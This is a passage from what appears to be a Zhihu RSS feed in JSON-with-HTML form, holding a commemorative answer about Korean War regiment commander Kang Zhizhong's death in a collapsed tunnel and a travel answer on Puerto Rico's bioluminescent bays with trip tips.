href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486711749/answer/2120870917?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/263974088?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">云、大数据、人工智能时代，谈到对数据的个性化需求，哪些场景值得一提？</a><br><a href=\"http://www.zhihu.com/question/440978162?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">大数据互联网时代真的好吗?</a><br>\n","link":"http://www.zhihu.com/question/486711749/answer/2120870917?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"哪张照片让你懂得了团圆的意义？","date":"2021-09-22 03:48:56","description":"\n<p></p>\n<b></b><p><img src=\"https://pic4.zhimg.com/v2-8315bbd0e8344b1c5fdf3db1d6561e35_720w.jpg?rss\" data-caption=\"（左一，中国人民志愿军一军七师19团团长康致中）\" data-size=\"normal\" data-rawwidth=\"440\" data-rawheight=\"652\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在幽闭的环境下因缺氧窒息而死，会有多痛苦？口唇、颜面会被憋得青紫，会不自觉地想要大口呼吸，身体会不由自主地进入痉挛状态，甚至会撕扯掉自己的衣服，临终的面容往往极其狰狞和难看。</p>\n<p>然而，在1953年的6月26日朝鲜战场上某个被炸塌的坑道里，当氧气耗尽的时候，这个男人的遗容却非同一般的安详。他穿好整整齐齐的军装、戴好军帽、盖好被子，面容平静地等待死亡的降临。最后陪在他身边的，是一张家人的照片。</p>\n<p>1953 年 1 月 22 日，中国人民解放军一军奉命改编为中国人民志愿军一军入朝参战。该军七师19团团长名为康致中。此时，抗美援朝战争已经进入了最后的阶段。经过两三年的惨烈厮杀，志愿军和联合国军在朝鲜半岛中部数百公里的战线上形成对峙——在联合国军一方，现代化火力和混凝土工事在山脊线上构成空前坚固的防线，火炮、轰炸机和机枪可以轻易把前沿变成一片火海；而在志愿军一方，勤劳而坚韧的士兵把一座座山挖空，巧妙并且坚固的坑道防线也足以让所有幻想前进的敌人付出血的代价。</p>\n<p>虽然双方均没有力量再发动大的攻势打破战争平衡，但小的攻防却几乎每时每刻都发生着。这一点，在志愿军方面来说是更加主动和积极的。这其实不难理解，对一个经历过无数苦难，刚刚才实现民族独立和解放的国家而言，那些质朴的官兵会下意识地认为，只要每往前攻克一个阵地，就让战火远离人民一点，祖国的安全就多一分回旋空间。</p>\n<p>这原本是1953年春季攻势第二阶段的一次小的军事行动——19团团长康致中将奉命带领部队攻击临津江畔笛音里西北的无名高地。但不幸的是，就在进攻发起前，由于情报泄露，19团指挥所所在196.0高地遭到联合国军的集中轰炸。倒塌的土石将坑道所有进出口全部掩埋，包括康致中在内，指挥所一百多名志愿军官兵全部在坑道里窒息而亡。直到两个月后，工兵把那个炸塌的坑道口挖开，人们才看到他安安静静地躺在床上。</p>\n<p>康致中是抗美援朝战争中牺牲的最后一名志愿军团长。据资料记载，他的遗体被装殓于一个炮弹箱内，安葬于朝鲜江原道铁原郡的一处志愿军墓地。其实从第四次战役开始，有成千上万志愿军官兵牺牲在这片名叫“铁原”的地方。他们的浴血奋战最终在康致中牺牲的一个月后收到了回报——世界上最强大的十七国联军最终放弃了与他们继续作战的想法，被迫签订了停战协议。</p>\n<p>当呼吸愈发沉重，当眼前黑暗降临，他和他们会想些什么？也许，他会回想起出征临别前与妻儿拍“团圆照”的这一幕：你看，照片上的妻子面色凝重，孩子的眼里写满好奇，唯有他留下的表情却是决然与轻松。其实别人不知道，这便是一名志愿军战士能带走和能留下的全部了。</p>\n<p>什么是团圆？对于大多数人来说是家人闲坐，灯火可亲；但<b>对于那个年代的他和他们而言，团圆则是哪怕我粉身碎骨、魂飞魄散，也要保山河无恙、亲人安好。</b></p>\n<p>我是钧钧，感谢您阅读我的观点。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fe09d8c566befa3ec6e2bdf3e30fbb5c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"655\" data-rawheight=\"398\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jun-zheng-ping-39?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">钧正平</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/487183458/answer/2130804237?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">26 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/47196303?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你见到最幸福的一张照片是什么？</a><br><a href=\"http://www.zhihu.com/question/265773951?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪个瞬间让你觉得摄影是一件很幸福的事？</a><br>\n","link":"http://www.zhihu.com/question/487183458/answer/2130804237?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"在路上的哪个瞬间让你发现「旅行成为疲惫生活中的一束光」？","date":"2021-09-22 02:22:54","description":"\n<p>有一段旅行因为特殊的光亮，将一辈子住在我的记忆里。每当我疲惫不堪，闭上眼睛都会回到当初那个温暖松弛、魔幻震撼，满心满眼熠熠生辉的地方。</p>\n<blockquote><i>Bread feeds the body, indeed, but flowers feed also the soul. 面包能补足肉身，而花朵能丰满灵魂。 - The Koran 古兰经</i></blockquote>\n<hr>\n<p>我要说的<b>「旅行之光」</b>真实存在。</p>\n<p>但它不是极光，甚至不来自太阳或天空。除了亲历者，可能很少有人能想象，地球上还有另一种更加宏大神奇的光亮，那就是「<b>黑夜中的荧光海」</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0fbb1b7982375911944146465bbad540_720w.jpg?rss\" data-caption=\"《Life of Pi》\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-0fbb1b7982375911944146465bbad540\" data-watermark-src=\"v2-bb372cfdb172d02b433866f930dd42be\" data-private-watermark-src=\"v2-c8ab47bf335017121d7aabe208e387d5\"></p>\n<p>它是大自然的免费馈赠，美感却比得上百万特效的电影场景。</p>\n<p>真正的<b>醉后不知天在水，满船清梦压星河</b>。</p>\n<p>从海底观赏「星星的呼吸」，闪烁的波光会美到让你忘却了自己的呼吸。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ec7a082e0d7883a42ef019264443be3f_720w.jpg?rss\" data-caption=\"真实的中美洲荧光海\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"374\" data-watermark=\"watermark\" data-original-src=\"v2-ec7a082e0d7883a42ef019264443be3f\" data-watermark-src=\"v2-e2a218a590884b52cb18c116aa5670a6\" data-private-watermark-src=\"v2-3000c05e6fd76e274ace2521f01e2ccc\"></p>\n<p>白天的海岛艳烈热情，晚上却像换装一般清凉神秘。</p>\n<p>当你第一次来到这里，会突然觉得天地混沌了起来。</p>\n<p>看近处，仿佛置身云端仰俯星河；望远方，又好像海底世界仙气升腾。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-244182739dc333523a4b2414c71b3cf0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"900\" data-watermark=\"watermark\" data-original-src=\"v2-244182739dc333523a4b2414c71b3cf0\" data-watermark-src=\"v2-d9a405ba3a501c036603a42f74f4ddb0\" data-private-watermark-src=\"v2-797568a2a84cabdd5eb70ca06a79bc91\"></p>\n<p>那光不是静冷的，它随着海水搅动着、蔓延着，层层叠叠得来到你的脚下。</p>\n<p>越来越近，越来越响。</p>\n<p>刷，刷，刷。</p>\n<p>终于和人类拥抱碰撞，迸发出<b>「哗啦」一声绽放</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5516b8780fa6b4546a81ba8d6d76f239_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2560\" data-rawheight=\"1707\" data-watermark=\"watermark\" data-original-src=\"v2-5516b8780fa6b4546a81ba8d6d76f239\" data-watermark-src=\"v2-194db919326610f3e93dcc504f28553f\" data-private-watermark-src=\"v2-32a25d2d94a2117c845127c89f2dcb1a\"></p>\n<p>万物静谧修养，月光皎洁修长。</p>\n<p>只有荧光海里的小生物趁着黑夜忙碌得翻滚。</p>\n<p>我站在夜空中感受着湿暖微咸的海风，发丝是轻盈的，皮肤是湿润的，心灵在云做的枕头和水做的摇篮里缓缓下沉。</p>\n<p><b>世界和谐美好，天地万物合一。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-75a83d3f482b11cfd0c337ff671c56af_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2560\" data-rawheight=\"1707\" data-watermark=\"watermark\" data-original-src=\"v2-75a83d3f482b11cfd0c337ff671c56af\" data-watermark-src=\"v2-7ef3f133e0d9ec7f4b252c21311513b6\" data-private-watermark-src=\"v2-c4fef8362facc40abad873659bada19d\"></p>\n<p>这是我去过最不可思议的地方，也是最想带孩子重游的海滩。欢迎来到我的<b>「人生旅行愿望清单」</b>之 ——<u><b>波多黎各荧光海</b>。</u></p>\n<hr>\n<h2>01 荧光海是什么？</h2>\n<p>荧光海的学名叫做Bioluminescence Water（生物发光海域），是一种叫做鞭毛藻（dinoflagellates）的极小的单细胞组织带来的发光现象。</p>\n<p>鞭毛藻其实非常普通，但在一片海域中大量生存却十分少见。大概要一加仑的水里有成千上万的这种生物才能用肉眼看出来。</p>\n<p>在你轻触海水的那一刻，鞭毛藻的自卫反应带来了荧光效果。</p>\n<p>船桨仿佛变成了一根有魔法的仙女棒。随着轻轻的搅动泛出一种散漫的、蓝绿色的荧光，看起来就像海水活跃了起来。</p>\n<p>它在你的用力下瞬间达到顶峰，随后向船尾的方向慢慢散去。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5836c48669f3c7d8692cf8b785525cf0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-5836c48669f3c7d8692cf8b785525cf0\" data-watermark-src=\"v2-d64e0b153baa5732a4d79442814813d3\" data-private-watermark-src=\"v2-bdc8789f2ead691f3f0ae78e42769f32\"></p>\n<p>几艘小船这里一动，那里一动。</p>\n<p>整片海也忽明忽暗此起彼伏，真的有一种星辰大海的美感。</p>\n<p>真实的视觉效果大概是下图这个样子。</p>\n<p>很可惜当年我们去的时候没有专业设备，荧光很明显，可手机完全拍不出来。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-34ee7d75b9f167e0c774f8436b0d79b6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"669\" data-rawheight=\"446\" data-watermark=\"watermark\" data-original-src=\"v2-34ee7d75b9f167e0c774f8436b0d79b6\" data-watermark-src=\"v2-82905bf8f02bc16dad667ddff317ef41\" data-private-watermark-src=\"v2-6516a6b9acc2a73f389c9fdb27cb8457\"></p>\n<h2>02 哪里有荧光海？</h2>\n<p>世界上只有五个生态系统有这种大量聚集的浮游生物，而波多黎各又算得上是为数不多的荧光海中的「天花板」。去那里游玩的旅行者，有很多都跟我们一样是冲着这个去打卡的。<sup data-text=\"\" data-url=\"https://www.discoverpuertorico.com/article/exploring-puerto-ricos-bioluminescent-bays\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\">[1]</sup></p>\n<p>其中最著名的要数Mosquito Bay（下图最右）、La Parguera（左下角）和离首都圣胡安San Juan最近的Laguna Grande三个海域（下图标记）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c5c7b9ee2a8716848ce9e99a76f982ba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1624\" data-rawheight=\"636\" data-watermark=\"watermark\" data-original-src=\"v2-c5c7b9ee2a8716848ce9e99a76f982ba\" data-watermark-src=\"v2-84fe9a2337a2551a6f8305d98606d7b3\" data-private-watermark-src=\"v2-1c5432b5a20abf05ea59654033719a9d\"></p>\n<h3>❤️ Mosquito Bay</h3>\n<p>在主岛东侧的别克斯Vieques岛上，被2006年吉尼斯纪录认定为世界上最亮的生物发光海滩，去过的人都说它美到令人眩晕。</p>\n<p>这是因为它有大量的浮游生物，而周围红树林密布，光污染很少。特别是飓风鞭毛藻数量翻倍，达到了惊人的每加仑海水一百万到两百一十万个！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9d53903a7c455b7caabd485c32eedfc5_720w.jpg?rss\" data-caption=\"用手搅动海水时，荧光感比别的海滩更亮更大\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-9d53903a7c455b7caabd485c32eedfc5\" data-watermark-src=\"v2-55c9f9c3115cc91128f41168d492c631\" data-private-watermark-src=\"v2-47c30388547a50d2b2e385bc0ceeeb7d\"></p>\n<p>不过缺点是需要坐船或者飞机。船要90分钟，飞机只要十分钟。</p>\n<p>我们在别的中美洲国家旅游时，为了节省时间也会选择低空飞行的小飞机。虽然很颠簸很吵，但是方便快捷，看看海景也是很美的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-547df1ba386d871519b1d9c7c57c1929_720w.jpg?rss\" data-caption=\"这是在巴哈马的时候，跨岛就是这种窗户都不用关的小飞机\" data-size=\"normal\" data-rawwidth=\"3024\" data-rawheight=\"3024\" data-watermark=\"watermark\" data-original-src=\"v2-547df1ba386d871519b1d9c7c57c1929\" data-watermark-src=\"v2-795bcfcb3d755448652dbdc94a05c3ab\" data-private-watermark-src=\"v2-f295208f994ab46ff08efbbc7e3d004c\"></p>\n<p>去的时候要注意，尽量选新月的时候，月光暗一些荧光就更明显。</p>\n<p>租船可以看看有没有透明kayak的选项。OMG！写着写着我就想再去一次！！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9679391d71bfee8b76589ca3be489b47_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-9679391d71bfee8b76589ca3be489b47\" data-watermark-src=\"v2-0595ac28b5f145879238dcd9c9a6d812\" data-private-watermark-src=\"v2-82530ab03cb337e389059acedd1ae73b\"></p>\n<h3>❤️ La Parguera</h3>\n<p>这片海域位于波多黎各主岛西南角的拉哈斯Lajas城，从圣胡安开过去要两个小时。</p>\n<p>顺便说一下整个波多黎各都不大，面积9k平方公里的它只有海南岛的1/4，距离美国迈阿密只有一千六百多公立。</p>\n<p>相比其他两个地方，这里的特色优势是机动船只可以进入。在导游的指导下游客还可以下海，看着浮游生物在你的眼前发光、飘动~</p>\n<p>所以出海的时候穿着泳衣是最方便的啦！在热带，即便是晚上也不会冷哒~</p>\n<p><img src=\"https://pic1.zhimg.com/v2-89041366132061cf1da7cc97dc776821_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-89041366132061cf1da7cc97dc776821\" data-watermark-src=\"v2-5de1f12e137aeb5ea558bf6e49121d5e\" data-private-watermark-src=\"v2-3a9022b0f40dae11b95250c96f9f24c1\"></p>\n<h3>❤️ Laguna Grande</h3>\n<p>最后就是我们2015年选择去的这片海了！因为离首都近，它也是最popular的选择。晚上开着租的车就去了，回酒店也很方便。</p>\n<p>它所在的法哈多Fajardo严格来说不是「海滩」，而是一个狭长的运河形成的环礁湖。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-efc4eaa48b6f1d563adba70b81d7cc74_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-efc4eaa48b6f1d563adba70b81d7cc74\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>当天我们快五点出发，六点半准备完毕。上小船后马上进入了一片巨大的红树林隧道，奋力划了半个多小时才穿出去。</p>\n<p>选择近的地方的劣势就是，<b>这片海整个岸边都都漂满了厚厚的海草！！！整片海！！！</b></p>\n<p>因为拨开海藻前行要很用力，不小心就会飞起一大片，贴在腿上、船上，甚至能把腿盖住。</p>\n<p>湿湿痒痒的，确实有点影响心情和观赏体验。</p>\n<p>不过，可以从落日前为数不多的留影看出来，我们还是很激动滴，最后的结果也特别值得。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-58373d8ca1ef6670773bacbb650fd214_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-58373d8ca1ef6670773bacbb650fd214\" data-watermark-src=\"v2-ce985c1c144442a51edbb850cf663156\" data-private-watermark-src=\"v2-3cd66c089302746862619126a8e487a2\"></p>\n<p>达到了开阔海域后天还没黑，教练就让我们原地等待，然后告诉我们，<b>「其实水里的发光物质与萤火虫身上的类似，只是不会主动发光一定需要触碰」。</b></p>\n<p>七点半夜幕降临了，大家纷纷开始用手和浆在水里拨动，就看到了一开始的效果啦！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e5b88b7310959decd6e78db98b8e15ab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"2448\" data-watermark=\"watermark\" data-original-src=\"v2-e5b88b7310959decd6e78db98b8e15ab\" data-watermark-src=\"v2-7612d5dbcb9e19c81daa1913c329d150\" data-private-watermark-src=\"v2-25dce9d44233200ea309689e722af5a5\"></p>\n<h2>03 出行Tips</h2>\n<p>如果有朋友相等疫情之后去波多黎各玩，我想分享如下建议：</p>\n<h3>❤️ 关于看荧光海</h3>\n<ol>\n<li>Vieques岛划船虽然贵一点，但是是观赏荧光海的最佳地点，建议提前预定夜晚kayak。</li>\n<li>最理想的kayaking装扮是泳衣+上身轻薄罩衣。</li>\n<li>尽管教练会讲解示范，但是Kayaking要力量、技巧和默契的多重配合，而大多数人都是第一次滑容易跑偏或者掉队，这个时候租船公司会用大灯来引导、集合。所以细心耐心的服务还是很重要的！我们就被一家叫IKA的公司扔在海面了一小会儿。还好有其他人一起，要不然伸手不见五指的真害怕。预订的时候多看看评价，选择英语好、态度好、拍照服务好的租船公司。</li>\n</ol>\n<h3>❤️ 关于去波多黎各</h3>\n<ol>\n<li>我特别喜欢这个地方，因为它各结合了城市风光、户外活动和海景度假，有历史有风光，活动可静可动、可紧可慢。</li>\n<li>作为美国的境外领土，距离近没有时差，只需美签，货币是美金，官方语言是英语和西语，自驾只需有含美国地图的GPS即可。</li>\n<li>气氛超级洋溢热情！！虽然城市比较老破，但是人都有善爱笑。</li>\n<li>疫情前消费水平很低，美国常见的超市、药店、快餐都有。我们订的是从多伦多出发的「1 Stop机票 +  高尔夫度假村King Bed +旅游保险 + 荧光海划船」套餐，加上租车、加油、停车费、餐费、纪念品，俩人五天一共$2k出头，在中美洲旅游胜地里当时也算比较划算的啦！</li>\n<li>生物特别丰富，在我们住的酒店出门就是两米多长的绿鬃蜥满地爬，还有各种散养的白鹭、乌鸦和小蜥蜴。海边有寄居蟹，热带雨林有3cm长的小树蛙，十分可爱~</li>\n</ol>\n<p><img src=\"https://pic4.zhimg.com/v2-bd2ea78691f0cb971f5787fd6822f2ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4256\" data-rawheight=\"2832\" data-watermark=\"watermark\" data-original-src=\"v2-bd2ea78691f0cb971f5787fd6822f2ad\" data-watermark-src=\"v2-50816baf0beb68f698c69613c6576468\" data-private-watermark-src=\"v2-56af294fafde8432df1acb4518418876\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a9eaf7551512eff89334662bb83f4227_720w.jpg?rss\" data-caption=\"酒店随便拍拍就很美\" data-size=\"normal\" data-rawwidth=\"1627\" data-rawheight=\"1627\" data-watermark=\"watermark\" data-original-src=\"v2-a9eaf7551512eff89334662bb83f4227\" data-watermark-src=\"v2-366e8a394ac6f31d1fd3afd2e8259341\" data-private-watermark-src=\"v2-e1914d27a9dc5857ab41e6a21006e204\"></p>\n<p>其他建议打卡地方有，</p>\n<p><b><u> 圣胡安老城 Castillo San Cristobal Fort &amp; El Morro Castle</u></b><sup data-text=\"\" data-url=\"http://www.nps.gov/saju/index.htm\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"2\">[2]</sup></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c9b5c2afac9518babec42559da008bcd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"2448\" data-watermark=\"watermark\" data-original-src=\"v2-c9b5c2afac9518babec42559da008bcd\" data-watermark-src=\"v2-10015742e9021b75bbf610581a5d766c\" data-private-watermark-src=\"v2-fb69f229689f5b55f0e05209892d9cef\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-83126921abf3864432e76ae1275975c7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2365\" data-rawheight=\"2365\" data-watermark=\"watermark\" data-original-src=\"v2-83126921abf3864432e76ae1275975c7\" data-watermark-src=\"v2-77a8d66bb7e1080a1e666607ea701447\" data-private-watermark-src=\"v2-d55f8709e968409f6b6783e2c498bfd0\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-63ec93ada0dc63ee5c88f0222198f7db_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2242\" data-rawheight=\"2242\" data-watermark=\"watermark\" data-original-src=\"v2-63ec93ada0dc63ee5c88f0222198f7db\" data-watermark-src=\"v2-d05f00b522caa6120af3b954ea165c51\" data-private-watermark-src=\"v2-389feec225bd21de7bb68ec9f7e677cc\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0868928f9d142f251eca00d0630f263f_720w.jpg?rss\" data-caption=\"世界上最美的篮球场\" data-size=\"normal\" data-rawwidth=\"2361\" data-rawheight=\"2361\" data-watermark=\"watermark\" data-original-src=\"v2-0868928f9d142f251eca00d0630f263f\" data-watermark-src=\"v2-f68d2063c1fa1ee0848bb9a25880c30d\" data-private-watermark-src=\"v2-4427cef3cf307448562bab1459f60b5b\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5c87bf163df085153d588af6e68e9463_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"2448\" data-watermark=\"watermark\" data-original-src=\"v2-5c87bf163df085153d588af6e68e9463\" data-watermark-src=\"v2-665b27c88329920d26ba2b4f4669f63f\" data-private-watermark-src=\"v2-431539186d3b10858af013b330fcc3da\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c31554513da0f860309d354fdfc68ae9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1800\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-c31554513da0f860309d354fdfc68ae9\" data-watermark-src=\"v2-a01f2af96277fdb1bced33b65ec98b76\" data-private-watermark-src=\"v2-5b20f4aed3e71846fb2962efd4042b70\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4fe2782a5774b6958b5a06dd188626e0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-4fe2782a5774b6958b5a06dd188626e0\" data-watermark-src=\"v2-f3d6ff6c0080ab3e7212db00c1d710b5\" data-private-watermark-src=\"v2-8b52a939ea7ddd0c5579458b71ded32d\"></p>\n<p><b> El Yunque National Forest热带雨林</b><sup data-text=\"\" data-url=\"http://www.fs.usda.gov/elyunque\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"3\">[3]</sup></p>\n<p><img src=\"https://pic3.zhimg.com/v2-169efb005782d6c0019b7d40d3e99234_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"2448\" data-watermark=\"watermark\" data-original-src=\"v2-169efb005782d6c0019b7d40d3e99234\" data-watermark-src=\"v2-6d49e185c3feab9cf4e8db8a93894b22\" data-private-watermark-src=\"v2-4b6c89c3cad242af28a6588bbd80d0b0\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-bded684f01123d589276e4e5adeb7758_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2196\" data-rawheight=\"2196\" data-watermark=\"watermark\" data-original-src=\"v2-bded684f01123d589276e4e5adeb7758\" data-watermark-src=\"v2-f01032ebabdfba2f14ef3090232d6640\" data-private-watermark-src=\"v2-c57201d634e21a3a33980c9ef3f54164\"></p>\n<p><b> Casa Bacardi酒厂</b><sup data-text=\"\" data-url=\"http://www.visitcasabacardi.com\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"4\">[4]</sup></p>\n<p>这里是世界上最大的朗姆酒工厂，从1830年至今公司仍由Bacardi家族私有，标志是一只霸气十足的大蝙蝠。</p>\n<p>在这里你可以尽情品尝各种口味的朗姆酒，还可以定制独一无二的烫金版Reserved Rum带回家。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-10f9c55fdceafe3f3ba402e1616e1d61_720w.jpg?rss\" data-caption=\"吃吃喝喝再买一瓶当纪念品\" data-size=\"normal\" data-rawwidth=\"2318\" data-rawheight=\"2318\" data-watermark=\"watermark\" data-original-src=\"v2-10f9c55fdceafe3f3ba402e1616e1d61\" data-watermark-src=\"v2-0fe90676a531ec17feb73f3a66c66f5b\" data-private-watermark-src=\"v2-889e4d6d37c141349438121b3566900e\"></p>\n<p>说起吃，中美洲食物食材新鲜、调味丰富，简简单单的饭也很有滋味，真的特别合我的胃口。</p>\n<p>什么龙虾、炸丸子、炸鱿鱼、炸青蕉，配合着live music和浓郁清甜的mojito，饭后再来一杯一点都不苦涩发酸、口感超级顺滑、香飘十里的Kona咖啡。</p>\n<p>啊，人生简直太过美妙~</p>\n<p><img src=\"https://pic3.zhimg.com/v2-19248dda933ff3d5f79e24e2884200ea_720w.jpg?rss\" data-caption=\"这些是在老城的Cinema Bar 1950餐厅和Bad Ass Coffee，裂墙推荐、回味至今\" data-size=\"normal\" data-rawwidth=\"1634\" data-rawheight=\"1625\" data-watermark=\"watermark\" data-original-src=\"v2-19248dda933ff3d5f79e24e2884200ea\" data-watermark-src=\"v2-f4b8b1a2c4072db817c1000221fbf56d\" data-private-watermark-src=\"v2-2691b0610daa3ff29adf6aa4e445bd39\"></p>\n<p><b> Snorkelling 浮潜</b></p>\n<p>最好的活动地点在主岛东边的Culebra或Vieques小岛，以及南部的Ponce。但因为时间原因我们就在度假村尝试了一下，也很好看。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a09728df127e8fab4a35513a18591707_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1535\" data-rawheight=\"1535\" data-watermark=\"watermark\" data-original-src=\"v2-a09728df127e8fab4a35513a18591707\" data-watermark-src=\"v2-2ebc5936b64b3cb21d7f049047bda4bd\" data-private-watermark-src=\"v2-ef1c8fbe63a63ea99b17119990f76fe2\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7df54fe309eb77a3df2434166e0b05cf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1535\" data-rawheight=\"1535\" data-watermark=\"watermark\" data-original-src=\"v2-7df54fe309eb77a3df2434166e0b05cf\" data-watermark-src=\"v2-2d5e6dc6c7c44ecf56d33ec54aba62b1\" data-private-watermark-src=\"v2-3dad9b2862640fb73e7aa57dda62672b\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e2a53af9815d75157e752e1436573811_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1535\" data-rawheight=\"1535\" data-watermark=\"watermark\" data-original-src=\"v2-e2a53af9815d75157e752e1436573811\" data-watermark-src=\"v2-d1360b476cd911bb98784da9abd58f5e\" data-private-watermark-src=\"v2-c7d61dbb9ad5e5dd55aca73627c835b2\"></p>\n<hr>\n<h3>❤️ 写在最后的话：</h3>\n<p>我一直觉得好的旅行是里面有很多很多时刻，你在无数个日夜之后都会在深夜里想起，并带给你一种满足、放松、愉悦的感受。</p>\n<p>波多黎各的120个小时就是这样的存在。</p>\n<p>当时我的一份工作被优化了，临时决定出门放松一下，花了一个周末的时间就把所有的行程订好了。虽然也有小的瑕疵，但在每天的暴走和观赏中真的得到了全身心的放松，至今都觉得非常正确、回味无穷。</p>\n<p>希望被疫情戏虐之后，这里的经济能够慢慢复苏，让更多的人来享受旅行的宁静和美好。</p>\n<p>正如《古兰经》所说，<b><u>人们需要面包，也需要花朵。</u></b></p>\n<p>把波多黎各的凤凰木送给知友们，希望你们也可以在忙碌的生活中感受到这种明亮鲜艳的生活之美。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4730f540f55b20cd7af9c28fbe230d47_720w.jpg?rss\" data-caption=\"“叶如飞凰之羽，花若丹凤之冠”\" data-size=\"normal\" 